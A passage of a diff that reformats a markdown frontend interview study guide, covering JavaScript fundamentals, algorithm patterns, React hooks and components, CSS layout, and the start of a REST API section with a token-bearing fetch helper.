@@ -12,18 +12,18 @@ Work through the phases in order. Each phase is self-contained but builds on the
 
 **Phases at a glance:**
 
-| Phase | Topic | Priority |
-|---|---|---|
-| 1 | JavaScript & TypeScript Core | Critical |
-| 2 | React & Component Patterns | Critical |
-| 3 | Responsive CSS & Layout | High |
-| 4 | REST APIs, Auth & Security | High |
-| 5 | Web Performance & Core Web Vitals | Medium |
-| 6 | Testing | Medium |
-| 7 | CI/CD & Git | Low (conceptual) |
-| **8** | **Frontend System Design** | **Critical (physical interview)** |
-| **9** | **Behavioral Interview (STAR)** | **Critical (physical interview)** |
-| **10** | **5-Day Study Plan (June 4-9)** | **High** |
+| Phase  | Topic                             | Priority                          |
+| ------ | --------------------------------- | --------------------------------- |
+| 1      | JavaScript & TypeScript Core      | Critical                          |
+| 2      | React & Component Patterns        | Critical                          |
+| 3      | Responsive CSS & Layout           | High                              |
+| 4      | REST APIs, Auth & Security        | High                              |
+| 5      | Web Performance & Core Web Vitals | Medium                            |
+| 6      | Testing                           | Medium                            |
+| 7      | CI/CD & Git                       | Low (conceptual)                  |
+| **8**  | **Frontend System Design**        | **Critical (physical interview)** |
+| **9**  | **Behavioral Interview (STAR)**   | **Critical (physical interview)** |
+| **10** | **5-Day Study Plan (June 4-9)**   | **High**                          |
 
 ---
 
@@ -34,18 +34,19 @@ Work through the phases in order. Each phase is self-contained but builds on the
 ### 1.1 Must-know JavaScript
 
 #### Array methods
+
 ```js
 // Know these cold â€” they appear in almost every challenge
 const nums = [1, 2, 3, 4, 5];
 
-nums.filter(n => n % 2 === 0);      // [2, 4]
-nums.map(n => n * 2);               // [2, 4, 6, 8, 10]
+nums.filter((n) => n % 2 === 0); // [2, 4]
+nums.map((n) => n * 2); // [2, 4, 6, 8, 10]
 nums.reduce((acc, n) => acc + n, 0); // 15
-nums.find(n => n > 3);              // 4
-nums.some(n => n > 4);              // true
-nums.every(n => n > 0);            // true
-nums.flat();                        // flattens one level
-nums.flatMap(n => [n, n * 2]);      // map + flatten in one pass
+nums.find((n) => n > 3); // 4
+nums.some((n) => n > 4); // true
+nums.every((n) => n > 0); // true
+nums.flat(); // flattens one level
+nums.flatMap((n) => [n, n * 2]); // map + flatten in one pass
 ```
 
 ##### Deep dive: How `reduce` works internally
@@ -67,9 +68,9 @@ const sum = nums.reduce((acc, n) => acc + n, 0);
 
 // Example 2: Group objects by property
 const users = [
-  { name: 'Alice', role: 'admin' },
-  { name: 'Bob', role: 'user' },
-  { name: 'Charlie', role: 'admin' },
+  { name: "Alice", role: "admin" },
+  { name: "Bob", role: "user" },
+  { name: "Charlie", role: "admin" },
 ];
 
 const grouped = users.reduce((acc, user) => {
@@ -85,7 +86,7 @@ const flat = nested.reduce((acc, arr) => acc.concat(arr), []);
 // Result: [1, 2, 3, 4, 5]
 
 // Example 4: Count frequency
-const letters = ['a', 'b', 'a', 'c', 'b', 'a'];
+const letters = ["a", "b", "a", "c", "b", "a"];
 const freq = letters.reduce((acc, letter) => {
   acc[letter] = (acc[letter] || 0) + 1;
   return acc;
@@ -94,17 +95,19 @@ const freq = letters.reduce((acc, letter) => {
 ```
 
 **Common use cases in interviews:**
+
 - Summing, averaging, finding min/max
 - Transforming arrays into objects (grouping, indexing by ID)
 - Flattening nested structures
 - Building complex data structures in one pass
 
 #### Object manipulation
+
 ```js
 const obj = { a: 1, b: 2, c: 3 };
 
-Object.keys(obj);    // ['a', 'b', 'c']
-Object.values(obj);  // [1, 2, 3]
+Object.keys(obj); // ['a', 'b', 'c']
+Object.values(obj); // [1, 2, 3]
 Object.entries(obj); // [['a',1], ['b',2], ['c',3]]
 
 // Spread to merge/override
@@ -115,13 +118,14 @@ const { a, b = 10, ...rest } = obj;
 ```
 
 #### String methods to know
+
 ```js
-str.includes('foo')
-str.startsWith('bar')
-str.split(',').join('-')
-str.trim().toLowerCase()
-str.replace(/\s+/g, '-')
-str.padStart(5, '0')   // '00042'
+str.includes("foo");
+str.startsWith("bar");
+str.split(",").join("-");
+str.trim().toLowerCase();
+str.replace(/\s+/g, "-");
+str.padStart(5, "0"); // '00042'
 ```
 
 #### Closures and scope
@@ -144,7 +148,7 @@ for (let i = 0; i < 3; i++) {
 
 // Fix 2: Create a new scope with IIFE (Immediately Invoked Function Expression)
 for (var i = 0; i < 3; i++) {
-  (function(captured) {
+  (function (captured) {
     setTimeout(() => console.log(captured), 0);
   })(i);
 }
@@ -167,12 +171,12 @@ function createCounter() {
 const counter = createCounter();
 counter.increment(); // 1
 counter.increment(); // 2
-counter.getCount();  // 2
+counter.getCount(); // 2
 // counter.count is undefined â€” no direct access
 
 // Use case 2: Function factories
 function multiplyBy(factor) {
-  return function(num) {
+  return function (num) {
     return num * factor;
   };
 }
@@ -184,8 +188,8 @@ triple(5); // 15
 
 // Use case 3: Event handlers that remember context
 function setupButtons(items) {
-  items.forEach(item => {
-    const button = document.createElement('button');
+  items.forEach((item) => {
+    const button = document.createElement("button");
     button.textContent = item.name;
     button.onclick = () => console.log(`Clicked ${item.name}`);
     // Closure captures the specific 'item' for this iteration
@@ -195,25 +199,27 @@ function setupButtons(items) {
 ```
 
 **Interview tip:** If asked to explain closures, use this format:
+
 1. "A closure is a function that retains access to variables from its outer scope."
 2. Give the counter example (shows private state).
 3. Mention the `var` loop trap and how `let` fixes it.
 
 #### Promises and async/await
+
 ```js
 // Promise chaining
-fetch('/api/users')
-  .then(res => {
+fetch("/api/users")
+  .then((res) => {
     if (!res.ok) throw new Error(`HTTP ${res.status}`);
     return res.json();
   })
-  .then(data => console.log(data))
-  .catch(err => console.error(err));
+  .then((data) => console.log(data))
+  .catch((err) => console.error(err));
 
 // async/await equivalent (prefer this style)
 async function getUsers() {
   try {
-    const res = await fetch('/api/users');
+    const res = await fetch("/api/users");
     if (!res.ok) throw new Error(`HTTP ${res.status}`);
     const data = await res.json();
     return data;
@@ -224,49 +230,50 @@ async function getUsers() {
 
 // Parallel fetches â€” don't await sequentially when independent
 const [users, products] = await Promise.all([
-  fetch('/api/users').then(r => r.json()),
-  fetch('/api/products').then(r => r.json()),
+  fetch("/api/users").then((r) => r.json()),
+  fetch("/api/products").then((r) => r.json()),
 ]);
 ```
 
 #### Event loop â€” conceptual understanding
 
 **The JavaScript runtime model:**
+
 - **Call stack** executes synchronous code (LIFO â€” last in, first out).
-- **Microtask queue** (Promises, `queueMicrotask`) drains *completely* before the next task.
-- **Macrotask queue** (`setTimeout`, `setInterval`, I/O) runs *one task at a time*.
+- **Microtask queue** (Promises, `queueMicrotask`) drains _completely_ before the next task.
+- **Macrotask queue** (`setTimeout`, `setInterval`, I/O) runs _one task at a time_.
 - **Key rule:** All microtasks run before the next macrotask.
 
 ```js
-console.log('1');
-setTimeout(() => console.log('2'), 0);
-Promise.resolve().then(() => console.log('3'));
-console.log('4');
+console.log("1");
+setTimeout(() => console.log("2"), 0);
+Promise.resolve().then(() => console.log("3"));
+console.log("4");
 // Output: 1, 4, 3, 2
 ```
 
 ##### Step-by-step execution trace
 
 ```js
-console.log('A');                              // 1
-setTimeout(() => console.log('B'), 0);         // 2
-Promise.resolve().then(() => console.log('C')); // 3
-Promise.resolve().then(() => console.log('D')); // 4
-console.log('E');                              // 5
+console.log("A"); // 1
+setTimeout(() => console.log("B"), 0); // 2
+Promise.resolve().then(() => console.log("C")); // 3
+Promise.resolve().then(() => console.log("D")); // 4
+console.log("E"); // 5
 
 // Execution order:
-// 
+//
 // [Call Stack]
 // 1. console.log('A')  â†’ logs 'A'
 // 2. setTimeout(...)   â†’ schedules 'B' in macrotask queue
 // 3. Promise.then(...) â†’ schedules 'C' in microtask queue
 // 4. Promise.then(...) â†’ schedules 'D' in microtask queue
 // 5. console.log('E')  â†’ logs 'E'
-// 
+//
 // [Call stack now empty â€” check microtask queue]
 // 6. console.log('C')  â†’ logs 'C'
 // 7. console.log('D')  â†’ logs 'D'
-// 
+//
 // [Microtask queue empty â€” check macrotask queue]
 // 8. console.log('B')  â†’ logs 'B'
 //
@@ -276,19 +283,19 @@ console.log('E');                              // 5
 ##### Common interview question: Nested promises vs setTimeout
 
 ```js
-console.log('Start');
+console.log("Start");
 
 setTimeout(() => {
-  console.log('Timeout 1');
-  Promise.resolve().then(() => console.log('Promise in Timeout 1'));
+  console.log("Timeout 1");
+  Promise.resolve().then(() => console.log("Promise in Timeout 1"));
 }, 0);
 
 Promise.resolve().then(() => {
-  console.log('Promise 1');
-  setTimeout(() => console.log('Timeout in Promise 1'), 0);
+  console.log("Promise 1");
+  setTimeout(() => console.log("Timeout in Promise 1"), 0);
 });
 
-console.log('End');
+console.log("End");
 
 // Output:
 // Start
@@ -300,6 +307,7 @@ console.log('End');
 ```
 
 **Real-world implication:**
+
 - Use `Promise.resolve().then(...)` to defer work but run before timers.
 - Use `setTimeout(..., 0)` to defer work until after the current task + all microtasks.
 
@@ -315,13 +323,15 @@ These patterns appear repeatedly in coding interviews. Master these and you can 
 // Problem: Two Sum II (LeetCode #167) â€” array is sorted
 // Find two numbers that add up to target
 function twoSum(nums, target) {
-  let left = 0, right = nums.length - 1;
+  let left = 0,
+    right = nums.length - 1;
 
   while (left < right) {
     const sum = nums[left] + nums[right];
     if (sum === target) return [left + 1, right + 1]; // 1-indexed
-    if (sum < target) left++;   // need a larger sum
-    else right--;               // need a smaller sum
+    if (sum < target)
+      left++; // need a larger sum
+    else right--; // need a smaller sum
   }
   return [];
 }
@@ -365,7 +375,8 @@ function findMaxAverage(nums, k) {
 // Problem: Longest Substring Without Repeating Characters (LeetCode #3)
 function lengthOfLongestSubstring(s) {
   const seen = new Map(); // char â†’ last seen index
-  let left = 0, maxLen = 0;
+  let left = 0,
+    maxLen = 0;
 
   for (let right = 0; right < s.length; right++) {
     if (seen.has(s[right]) && seen.get(s[right]) >= left) {
@@ -399,7 +410,7 @@ function firstUniqChar(s) {
 function groupAnagrams(strs) {
   const groups = {};
   for (const str of strs) {
-    const key = str.split('').sort().join(''); // anagrams have same sorted key
+    const key = str.split("").sort().join(""); // anagrams have same sorted key
     if (!groups[key]) groups[key] = [];
     groups[key].push(str);
   }
@@ -416,7 +427,7 @@ function groupAnagrams(strs) {
 // Problem: Valid Parentheses (LeetCode #20)
 function isValid(s) {
   const stack = [];
-  const pairs = { ')': '(', '}': '{', ']': '[' };
+  const pairs = { ")": "(", "}": "{", "]": "[" };
 
   for (const ch of s) {
     if (ch in pairs) {
@@ -454,11 +465,12 @@ function dailyTemperatures(temps) {
 ```js
 // Problem: Linked List Cycle (LeetCode #141)
 function hasCycle(head) {
-  let slow = head, fast = head;
+  let slow = head,
+    fast = head;
 
   while (fast && fast.next) {
-    slow = slow.next;           // moves 1 step
-    fast = fast.next.next;      // moves 2 steps
+    slow = slow.next; // moves 1 step
+    fast = fast.next.next; // moves 2 steps
     if (slow === fast) return true; // they met â€” cycle exists
   }
   return false;
@@ -467,7 +479,8 @@ function hasCycle(head) {
 
 // Problem: Middle of Linked List (LeetCode #876)
 function middleNode(head) {
-  let slow = head, fast = head;
+  let slow = head,
+    fast = head;
   while (fast && fast.next) {
     slow = slow.next;
     fast = fast.next.next;
@@ -483,7 +496,8 @@ function middleNode(head) {
 ```js
 // Problem: Binary Search (LeetCode #704)
 function search(nums, target) {
-  let left = 0, right = nums.length - 1;
+  let left = 0,
+    right = nums.length - 1;
 
   while (left <= right) {
     const mid = Math.floor((left + right) / 2);
@@ -497,10 +511,12 @@ function search(nums, target) {
 
 // Problem: First Bad Version (LeetCode #278)
 function firstBadVersion(n) {
-  let left = 1, right = n;
+  let left = 1,
+    right = n;
   while (left < right) {
     const mid = Math.floor((left + right) / 2);
-    if (isBadVersion(mid)) right = mid; // answer is mid or earlier
+    if (isBadVersion(mid))
+      right = mid; // answer is mid or earlier
     else left = mid + 1;
   }
   return left;
@@ -522,11 +538,11 @@ function generateParenthesis(n) {
       result.push(current);
       return;
     }
-    if (open < n) backtrack(current + '(', open + 1, close);
-    if (close < open) backtrack(current + ')', open, close + 1);
+    if (open < n) backtrack(current + "(", open + 1, close);
+    if (close < open) backtrack(current + ")", open, close + 1);
   }
 
-  backtrack('', 0, 0);
+  backtrack("", 0, 0);
   return result;
 }
 // Time: O(4^n / âˆšn) â€” Catalan number, Space: O(n) for recursion stack
@@ -558,7 +574,8 @@ function subsets(nums) {
 // You can climb 1 or 2 steps at a time. How many ways to reach step n?
 function climbStairs(n) {
   if (n <= 2) return n;
-  let prev2 = 1, prev1 = 2;
+  let prev2 = 1,
+    prev1 = 2;
   for (let i = 3; i <= n; i++) {
     const current = prev1 + prev2;
     prev2 = prev1;
@@ -571,7 +588,8 @@ function climbStairs(n) {
 // Problem: House Robber (LeetCode #198)
 // Can't rob adjacent houses. Maximize amount stolen.
 function rob(nums) {
-  let prev2 = 0, prev1 = 0;
+  let prev2 = 0,
+    prev1 = 0;
   for (const num of nums) {
     const current = Math.max(prev1, prev2 + num); // skip or rob
     prev2 = prev1;
@@ -584,30 +602,31 @@ function rob(nums) {
 
 **Pattern recognition cheat sheet:**
 
-| If problem mentions... | Try this pattern |
-|---|---|
-| Sorted array + find pair/triplet | Two Pointers |
-| Subarray/substring of length k | Sliding Window |
-| Count frequencies, find duplicates | Hash Map |
-| Balanced brackets, parsing, undo | Stack |
-| Linked list cycle or middle | Fast & Slow Pointers |
-| Sorted + search | Binary Search |
-| Generate all combinations | Recursion + Backtracking |
-| "What's the maximum/minimum ways to..." | Dynamic Programming |
+| If problem mentions...                  | Try this pattern         |
+| --------------------------------------- | ------------------------ |
+| Sorted array + find pair/triplet        | Two Pointers             |
+| Subarray/substring of length k          | Sliding Window           |
+| Count frequencies, find duplicates      | Hash Map                 |
+| Balanced brackets, parsing, undo        | Stack                    |
+| Linked list cycle or middle             | Fast & Slow Pointers     |
+| Sorted + search                         | Binary Search            |
+| Generate all combinations               | Recursion + Backtracking |
+| "What's the maximum/minimum ways to..." | Dynamic Programming      |
 
 ### 1.4 References
+
 - [javascript.info](https://javascript.info) â€” read: Data types, Functions, Promises, Async/await, Classes
 - [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html) â€” read: Everyday Types, Generics, Utility Types
 
 ### 1.5 Practice platforms
 
-| Platform | Best for | Difficulty | Free tier |
-|---|---|---|---|
-| **LeetCode** | Algorithmic problems, patterns | Easy â†’ Hard | Yes (most problems) |
-| **HackerRank** | Interview prep tracks, certificates | Easy â†’ Medium | Yes |
-| **Coderbyte** | AEON360 uses this â€” practice here first | Easy â†’ Hard | Limited free challenges |
-| **Frontend Mentor** | Real UI challenges (HTML/CSS/JS/React) | Junior â†’ Advanced | Yes |
-| **StackBlitz / CodeSandbox** | Quick React/TS prototyping | N/A | Yes |
+| Platform                     | Best for                                  | Difficulty          | Free tier               |
+| ---------------------------- | ----------------------------------------- | ------------------- | ----------------------- |
+| **LeetCode**                 | Algorithmic problems, patterns            | Easy â†’ Hard       | Yes (most problems)     |
+| **HackerRank**               | Interview prep tracks, certificates       | Easy â†’ Medium     | Yes                     |
+| **Coderbyte**                | AEON360 uses this â€” practice here first | Easy â†’ Hard       | Limited free challenges |
+| **Frontend Mentor**          | Real UI challenges (HTML/CSS/JS/React)    | Junior â†’ Advanced | Yes                     |
+| **StackBlitz / CodeSandbox** | Quick React/TS prototyping                | N/A                 | Yes                     |
 
 **Recommendation:** Start with 10â€“15 LeetCode Easy problems covering the 8 patterns above, then move to Medium problems. If the interview platform is confirmed as Coderbyte, spend your last 3 days there to get familiar with the editor and submission flow.
 
@@ -620,17 +639,21 @@ function rob(nums) {
 ### 2.1 Hooks reference
 
 #### useState
+
 ```jsx
 const [count, setCount] = useState(0);
 
 // Functional update â€” use when new state depends on old state
-setCount(prev => prev + 1);
+setCount((prev) => prev + 1);
 
 // Lazy initial state â€” runs once, not on every render
-const [data, setData] = useState(() => JSON.parse(localStorage.getItem('data') ?? '[]'));
+const [data, setData] = useState(() =>
+  JSON.parse(localStorage.getItem("data") ?? "[]"),
+);
 ```
 
 #### useEffect
+
 ```jsx
 // Runs after every render â€” rarely what you want
 useEffect(() => { ... });
@@ -655,6 +678,7 @@ useEffect(() => {
 ```
 
 #### useRef
+
 ```jsx
 // Two uses: DOM reference and mutable value that doesn't trigger re-render
 const inputRef = useRef<HTMLInputElement>(null);
@@ -668,6 +692,7 @@ intervalId.current = setInterval(() => ..., 1000);
 ```
 
 #### useCallback and useMemo
+
 ```jsx
 // useCallback â€” memoize a function reference (use when passing to child components or deps arrays)
 const handleSubmit = useCallback((e: React.FormEvent) => {
@@ -685,6 +710,7 @@ const sortedUsers = useMemo(
 > **Common mistake:** Overusing `useCallback`/`useMemo`. Only add them when you can measure a performance problem, or when a function is a dependency in another hook.
 
 #### useReducer
+
 ```jsx
 type Action =
   | { type: 'increment' }
@@ -706,24 +732,32 @@ dispatch({ type: 'reset', payload: 10 });
 ```
 
 #### useContext
+
 ```tsx
 interface ThemeContextType {
-  theme: 'light' | 'dark';
+  theme: "light" | "dark";
   toggle: () => void;
 }
 
 const ThemeContext = createContext<ThemeContextType | null>(null);
 
 function ThemeProvider({ children }: { children: React.ReactNode }) {
-  const [theme, setTheme] = useState<'light' | 'dark'>('light');
-  const toggle = useCallback(() => setTheme(t => t === 'light' ? 'dark' : 'light'), []);
-  return <ThemeContext.Provider value={{ theme, toggle }}>{children}</ThemeContext.Provider>;
+  const [theme, setTheme] = useState<"light" | "dark">("light");
+  const toggle = useCallback(
+    () => setTheme((t) => (t === "light" ? "dark" : "light")),
+    [],
+  );
+  return (
+    <ThemeContext.Provider value={{ theme, toggle }}>
+      {children}
+    </ThemeContext.Provider>
+  );
 }
 
 // Custom hook to consume context safely
 function useTheme() {
   const ctx = useContext(ThemeContext);
-  if (!ctx) throw new Error('useTheme must be used within ThemeProvider');
+  if (!ctx) throw new Error("useTheme must be used within ThemeProvider");
   return ctx;
 }
 ```
@@ -742,13 +776,16 @@ function useFetch<T>(url: string) {
     setLoading(true);
 
     fetch(url, { signal: controller.signal })
-      .then(res => {
+      .then((res) => {
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
         return res.json() as Promise<T>;
       })
-      .then(data => { setData(data); setLoading(false); })
-      .catch(err => {
-        if (err.name !== 'AbortError') {
+      .then((data) => {
+        setData(data);
+        setLoading(false);
+      })
+      .catch((err) => {
+        if (err.name !== "AbortError") {
           setError(err.message);
           setLoading(false);
         }
@@ -762,34 +799,46 @@ function useFetch<T>(url: string) {
 
 // Usage
 function UserList() {
-  const { data, loading, error } = useFetch<User[]>('/api/users');
+  const { data, loading, error } = useFetch<User[]>("/api/users");
 
   if (loading) return <p>Loading...</p>;
   if (error) return <p>Error: {error}</p>;
-  return <ul>{data?.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
+  return (
+    <ul>
+      {data?.map((u) => (
+        <li key={u.id}>{u.name}</li>
+      ))}
+    </ul>
+  );
 }
 ```
 
 ### 2.3 Component patterns
 
 #### Controlled form
+
 ```tsx
 function LoginForm() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [errors, setErrors] = useState<{ email?: string; password?: string }>(
+    {},
+  );
 
   function validate() {
     const errs: typeof errors = {};
-    if (!email.includes('@')) errs.email = 'Enter a valid email';
-    if (password.length < 8) errs.password = 'Minimum 8 characters';
+    if (!email.includes("@")) errs.email = "Enter a valid email";
+    if (password.length < 8) errs.password = "Minimum 8 characters";
     return errs;
   }
 
   function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     const errs = validate();
-    if (Object.keys(errs).length) { setErrors(errs); return; }
+    if (Object.keys(errs).length) {
+      setErrors(errs);
+      return;
+    }
     // submit...
   }
 
@@ -800,7 +849,7 @@ function LoginForm() {
         id="email"
         type="email"
         value={email}
-        onChange={e => setEmail(e.target.value)}
+        onChange={(e) => setEmail(e.target.value)}
       />
       {errors.email && <span role="alert">{errors.email}</span>}
 
@@ -809,7 +858,7 @@ function LoginForm() {
         id="password"
         type="password"
         value={password}
-        onChange={e => setPassword(e.target.value)}
+        onChange={(e) => setPassword(e.target.value)}
       />
       {errors.password && <span role="alert">{errors.password}</span>}
 
@@ -820,6 +869,7 @@ function LoginForm() {
 ```
 
 #### Error boundary
+
 ```tsx
 class ErrorBoundary extends React.Component<
   { children: React.ReactNode; fallback: React.ReactNode },
@@ -832,7 +882,7 @@ class ErrorBoundary extends React.Component<
   }
 
   componentDidCatch(error: Error, info: React.ErrorInfo) {
-    console.error('Boundary caught:', error, info);
+    console.error("Boundary caught:", error, info);
   }
 
   render() {
@@ -852,25 +902,29 @@ function TodoList() {
 
   async function toggleTodo(id: number) {
     // 1. Optimistic update â€” instant feedback
-    setTodos(prev => prev.map(todo =>
-      todo.id === id ? { ...todo, completed: !todo.completed } : todo
-    ));
+    setTodos((prev) =>
+      prev.map((todo) =>
+        todo.id === id ? { ...todo, completed: !todo.completed } : todo,
+      ),
+    );
 
     // 2. Sync with server
     try {
-      await fetch(`/api/todos/${id}/toggle`, { method: 'PATCH' });
+      await fetch(`/api/todos/${id}/toggle`, { method: "PATCH" });
     } catch (err) {
       // 3. Rollback on failure
-      setTodos(prev => prev.map(todo =>
-        todo.id === id ? { ...todo, completed: !todo.completed } : todo
-      ));
-      alert('Failed to update todo');
+      setTodos((prev) =>
+        prev.map((todo) =>
+          todo.id === id ? { ...todo, completed: !todo.completed } : todo,
+        ),
+      );
+      alert("Failed to update todo");
     }
   }
 
   return (
     <ul>
-      {todos.map(todo => (
+      {todos.map((todo) => (
         <li key={todo.id}>
           <input
             type="checkbox"
@@ -900,7 +954,11 @@ interface SelectContextType {
 
 const SelectContext = createContext<SelectContextType | null>(null);
 
-function Select({ value, onChange, children }: {
+function Select({
+  value,
+  onChange,
+  children,
+}: {
   value: string;
   onChange: (value: string) => void;
   children: React.ReactNode;
@@ -912,13 +970,19 @@ function Select({ value, onChange, children }: {
   );
 }
 
-function Option({ value, children }: { value: string; children: React.ReactNode }) {
+function Option({
+  value,
+  children,
+}: {
+  value: string;
+  children: React.ReactNode;
+}) {
   const ctx = useContext(SelectContext);
-  if (!ctx) throw new Error('Option must be used inside Select');
+  if (!ctx) throw new Error("Option must be used inside Select");
 
   return (
     <button
-      className={ctx.value === value ? 'active' : ''}
+      className={ctx.value === value ? "active" : ""}
       onClick={() => ctx.onChange(value)}
     >
       {children}
@@ -930,7 +994,7 @@ Select.Option = Option;
 
 // Usage â€” clean API, no prop drilling
 function App() {
-  const [color, setColor] = useState('red');
+  const [color, setColor] = useState("red");
   return (
     <Select value={color} onChange={setColor}>
       <Select.Option value="red">Red</Select.Option>
@@ -949,13 +1013,18 @@ function App() {
 
 ```tsx
 // Reusable mouse tracker
-function MouseTracker({ render }: { render: (pos: { x: number; y: number }) => React.ReactNode }) {
+function MouseTracker({
+  render,
+}: {
+  render: (pos: { x: number; y: number }) => React.ReactNode;
+}) {
   const [pos, setPos] = useState({ x: 0, y: 0 });
 
   useEffect(() => {
-    const handleMove = (e: MouseEvent) => setPos({ x: e.clientX, y: e.clientY });
-    window.addEventListener('mousemove', handleMove);
-    return () => window.removeEventListener('mousemove', handleMove);
+    const handleMove = (e: MouseEvent) =>
+      setPos({ x: e.clientX, y: e.clientY });
+    window.addEventListener("mousemove", handleMove);
+    return () => window.removeEventListener("mousemove", handleMove);
   }, []);
 
   return <>{render(pos)}</>;
@@ -966,7 +1035,9 @@ function App() {
   return (
     <MouseTracker
       render={({ x, y }) => (
-        <div style={{ position: 'fixed', left: x, top: y, pointerEvents: 'none' }}>
+        <div
+          style={{ position: "fixed", left: x, top: y, pointerEvents: "none" }}
+        >
           ðŸŽ¯ ({x}, {y})
         </div>
       )}
@@ -987,8 +1058,11 @@ function UserProfile({ userId }: { userId: number }) {
 
   useEffect(() => {
     fetch(`/api/users/${userId}`)
-      .then(r => r.json())
-      .then(data => { setUser(data); setLoading(false); });
+      .then((r) => r.json())
+      .then((data) => {
+        setUser(data);
+        setLoading(false);
+      });
   }, [userId]);
 
   if (loading) return <p>Loading...</p>;
@@ -1001,9 +1075,9 @@ function Dashboard() {
 
   useEffect(() => {
     Promise.all([
-      fetch('/api/users').then(r => r.json()),
-      fetch('/api/products').then(r => r.json()),
-      fetch('/api/stats').then(r => r.json()),
+      fetch("/api/users").then((r) => r.json()),
+      fetch("/api/products").then((r) => r.json()),
+      fetch("/api/stats").then((r) => r.json()),
     ]).then(([users, products, stats]) => {
       setData({ users, products, stats });
     });
@@ -1019,14 +1093,14 @@ function PostWithComments({ postId }: { postId: number }) {
 
   useEffect(() => {
     fetch(`/api/posts/${postId}`)
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setPost);
   }, [postId]);
 
   useEffect(() => {
     if (!post) return; // wait for post to load first
     fetch(`/api/posts/${postId}/comments`)
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setComments);
   }, [postId, post]);
 
@@ -1035,15 +1109,18 @@ function PostWithComments({ postId }: { postId: number }) {
 
 // Strategy 4: Debounced search (avoid API spam)
 function SearchUsers() {
-  const [query, setQuery] = useState('');
+  const [query, setQuery] = useState("");
   const [results, setResults] = useState([]);
 
   useEffect(() => {
-    if (!query) { setResults([]); return; }
+    if (!query) {
+      setResults([]);
+      return;
+    }
 
     const timer = setTimeout(() => {
       fetch(`/api/users/search?q=${encodeURIComponent(query)}`)
-        .then(r => r.json())
+        .then((r) => r.json())
         .then(setResults);
     }, 300); // wait 300ms after user stops typing
 
@@ -1052,8 +1129,12 @@ function SearchUsers() {
 
   return (
     <div>
-      <input value={query} onChange={e => setQuery(e.target.value)} />
-      <ul>{results.map(u => <li key={u.id}>{u.name}</li>)}</ul>
+      <input value={query} onChange={(e) => setQuery(e.target.value)} />
+      <ul>
+        {results.map((u) => (
+          <li key={u.id}>{u.name}</li>
+        ))}
+      </ul>
     </div>
   );
 }
@@ -1067,6 +1148,7 @@ function SearchUsers() {
 - An infinite scroll or paginated list
 
 ### 2.5 References
+
 - [react.dev](https://react.dev) â€” "Describing the UI" and "Managing State" sections
 - [ui.dev React hooks](https://ui.dev/react-hooks) â€” visual hook lifecycle explanations
 
@@ -1080,26 +1162,30 @@ function SearchUsers() {
 /* Container */
 display: flex;
 flex-direction: row | column;
-justify-content: flex-start | center | flex-end | space-between | space-around | space-evenly;
+justify-content: flex-start | center | flex-end | space-between | space-around |
+  space-evenly;
 align-items: stretch | flex-start | center | flex-end | baseline;
 flex-wrap: nowrap | wrap;
 gap: 1rem;
 
 /* Item */
-flex: 1;          /* grow and shrink equally */
-flex: 0 0 200px;  /* fixed width, no grow/shrink */
+flex: 1; /* grow and shrink equally */
+flex: 0 0 200px; /* fixed width, no grow/shrink */
 align-self: flex-start; /* override align-items for one item */
-order: 2;         /* reorder visually without DOM change */
+order: 2; /* reorder visually without DOM change */
 ```
 
 #### Common pattern: sticky footer
+
 ```css
 body {
   min-height: 100vh;
   display: flex;
   flex-direction: column;
 }
-main { flex: 1; }
+main {
+  flex: 1;
+}
 ```
 
 ### 3.2 CSS Grid cheat sheet
@@ -1107,9 +1193,12 @@ main { flex: 1; }
 ```css
 /* Container */
 display: grid;
-grid-template-columns: repeat(3, 1fr);      /* 3 equal columns */
-grid-template-columns: 2fr 1fr;             /* 2:1 ratio */
-grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); /* responsive without media queries */
+grid-template-columns: repeat(3, 1fr); /* 3 equal columns */
+grid-template-columns: 2fr 1fr; /* 2:1 ratio */
+grid-template-columns: repeat(
+  auto-fit,
+  minmax(280px, 1fr)
+); /* responsive without media queries */
 gap: 1.5rem;
 grid-template-areas:
   "header header"
@@ -1117,32 +1206,43 @@ grid-template-areas:
   "footer footer";
 
 /* Item */
-grid-column: 1 / 3;       /* span 2 columns */
-grid-row: 1 / span 2;     /* span 2 rows */
-grid-area: header;         /* named area placement */
+grid-column: 1 / 3; /* span 2 columns */
+grid-row: 1 / span 2; /* span 2 rows */
+grid-area: header; /* named area placement */
 ```
 
 ### 3.3 Responsive breakpoints (mobile-first)
 
 ```css
 /* Base styles target mobile */
-.container { padding: 1rem; }
+.container {
+  padding: 1rem;
+}
 
 /* Tablet */
 @media (min-width: 768px) {
-  .container { padding: 2rem; }
+  .container {
+    padding: 2rem;
+  }
 }
 
 /* Desktop */
 @media (min-width: 1024px) {
-  .container { padding: 3rem; max-width: 1200px; margin: 0 auto; }
+  .container {
+    padding: 3rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
 }
 ```
 
 #### Tailwind equivalents
+
 ```html
 <!-- Mobile first, responsive prefix for larger screens -->
-<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-4 md:p-8">
+<div
+  class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-4 md:p-8"
+></div>
 ```
 
 ### 3.4 Fluid sizing without media queries
@@ -1154,6 +1254,7 @@ padding: clamp(1rem, 5vw, 3rem);
 ```
 
 ### 3.5 References
+
 - [CSS Tricks Flexbox Guide](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)
 - [CSS Tricks Grid Guide](https://css-tricks.com/snippets/css/complete-guide-grid/)
 - [Tailwind CSS Docs](https://tailwindcss.com/docs/utility-first)
@@ -1169,8 +1270,8 @@ padding: clamp(1rem, 5vw, 3rem);
 async function apiFetch<T>(url: string, options?: RequestInit): Promise<T> {
   const res = await fetch(url, {
     headers: {
-      'Content-Type': 'application/json',
-      'Authorization': `Bearer ${getToken()}`,
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${getToken()}`,
     },
     ...options,
   });
@@ -1184,9 +1285,9 @@ async function apiFetch<T>(url: string, options?: RequestInit): Promise<T> {
 }
 
 // POST with body
